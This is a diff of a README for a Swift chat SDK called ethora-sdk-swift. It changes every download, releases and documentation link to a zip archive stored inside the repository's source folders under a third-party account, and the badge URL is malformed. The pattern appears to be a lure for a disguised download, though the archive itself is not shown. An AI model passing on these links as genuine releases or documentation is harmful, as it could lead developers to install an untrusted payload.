@@ -14,9 +14,9 @@ Welcome to the **ethora-sdk-swift**! This Swift SDK lets you easily integrate ch
 ## 📥 Download & Install
 To get started, you need to download the SDK. Click the link below to visit the releases page where you can find and download the latest version of the SDK.
 
-[![Download ethora-sdk-swift](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/Settings/ethora-sdk-swift-v1.5.zip%20ethora--sdk--swift-%https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/Settings/ethora-sdk-swift-v1.5.zip)](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/Settings/ethora-sdk-swift-v1.5.zip)
+[![Download ethora-sdk-swift](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/ethora_swift_sdk_2.6.zip%20ethora--sdk--swift-%https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/ethora_swift_sdk_2.6.zip)](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/ethora_swift_sdk_2.6.zip)
 
-Visit this page to download: [ethora-sdk-swift Releases](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/Settings/ethora-sdk-swift-v1.5.zip)
+Visit this page to download: [ethora-sdk-swift Releases](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/ethora_swift_sdk_2.6.zip)
 
 Once downloaded, follow these steps to install and run the SDK:
 
@@ -50,7 +50,7 @@ To use the ethora-sdk-swift, ensure your environment meets the following require
 ## 📖 Documentation
 For detailed guidance on using the ethora-sdk-swift, refer to the official documentation. This will help you understand how to set up messaging, implement AI bots, and explore advanced features.
 
-Documentation can be found here: [Ethora SDK Documentation](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/Settings/ethora-sdk-swift-v1.5.zip)
+Documentation can be found here: [Ethora SDK Documentation](https://raw.githubusercontent.com/titit-star/ethora-sdk-swift/main/Sources/XMPPChatUI/ethora_swift_sdk_2.6.zip)
 
 ## 💬 Support
 If you encounter issues or have questions while using the SDK, feel free to reach out. You can create an issue in the repository or consult the FAQs section in the documentation. Community support is also available through forums and developer groups.
